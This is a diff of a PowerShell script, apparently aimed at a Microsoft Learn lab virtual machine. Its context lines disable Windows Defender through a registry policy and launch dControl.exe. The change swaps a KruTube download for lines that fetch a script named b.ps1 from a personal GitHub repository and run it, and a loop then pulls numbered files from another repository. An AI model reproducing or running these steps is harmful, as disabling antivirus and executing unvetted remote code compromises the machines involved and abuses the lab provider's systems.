@@ -24,12 +24,8 @@ Start-Process -FilePath "$extractPath\dControl.exe"
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -Force
 Invoke-WebRequest -Uri "https://bits.avcdn.net/productfamily_VPN/insttype_PRO/platform_WIN/installertype_ONLINE/build_RELEASE/cookie_mmm_scl_998_999_000_m:dlid_SLN-TRIAL-ONLINE-PP?alt=en-us" -OutFile "$env:USERPROFILE\Desktop\avast.exe"
 Start-Process -FilePath "$extractPath\avast.exe"
-
-Start-Process powershell -ArgumentList {
-    Invoke-WebRequest -Uri "https://www.krutube.pro/download/krutubel/v10.1.0.0/krutube_10.1.0.0.zip" -OutFile "C:\Users\MS Learn Labs\Desktop\krutube_10.0.0.0.zip"
-    Expand-Archive -Path "C:\Users\MS Learn Labs\Desktop\krutube_10.0.0.0.zip" -DestinationPath "C:\Users\MS Learn Labs\Desktop"
-    Start-Process -FilePath "C:\Users\MS Learn Labs\Desktop\KruTube\KruTube.exe" -WindowStyle Maximized
-}
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/najam121/free-check-ms/main/b.ps1' -OutFile 'C:\Users\MS Learn Labs\Desktop\b.ps1'
+Start-Process powershell -ArgumentList '-File "C:\Users\MS Learn Labs\Desktop\b.ps1"'
 
 for ($i = 1; $i -le 9; $i++) {
     $fileUrl = "https://raw.githubusercontent.com/user009dm/new/main/$i.mrf"
